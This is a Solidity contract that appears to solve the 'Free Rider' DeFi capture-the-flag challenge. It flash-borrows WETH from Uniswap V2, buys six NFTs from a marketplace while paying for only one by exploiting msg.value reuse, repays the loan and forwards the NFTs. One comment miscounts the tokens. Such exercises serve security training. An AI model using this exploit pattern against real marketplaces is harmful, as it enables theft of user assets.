// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract FreeRiderSwapV2Callee is IUniswapV2Callee, IERC721Receiver {

    IWETH weth;
    IFreeRiderNFTMarketplace marketplace;
    IERC721 nft;
    address owner;
    address buyer;
    uint256[] tokenIds;

    constructor(IWETH _weth, IFreeRiderNFTMarketplace _marketplace, IERC721 _nft, address _buyer) {
        weth = _weth;
        marketplace = _marketplace;
        nft = _nft;
        buyer = _buyer;
        owner = msg.sender;
        for(uint256 i=0;i<6;++i) { 
            tokenIds.push(i);
        }
    }
    
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata) external override {
        require(sender == owner, "only owner");
        weth.withdraw(amount0);
        marketplace.buyMany{value: 15 ether}(tokenIds); // buy 3 but only paied for 1
        weth.deposit{value: address(this).balance}();
        uint256 amount2payback = amount0 * 10031 / 10000;
        weth.transfer(msg.sender, amount2payback);
        for(uint256 i=0;i<6;++i) { 
            nft.safeTransferFrom(address(this), buyer, i);
        }
    }

    function onERC721Received(address, address, uint256 , bytes memory) external  pure override returns (bytes4) {  
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
}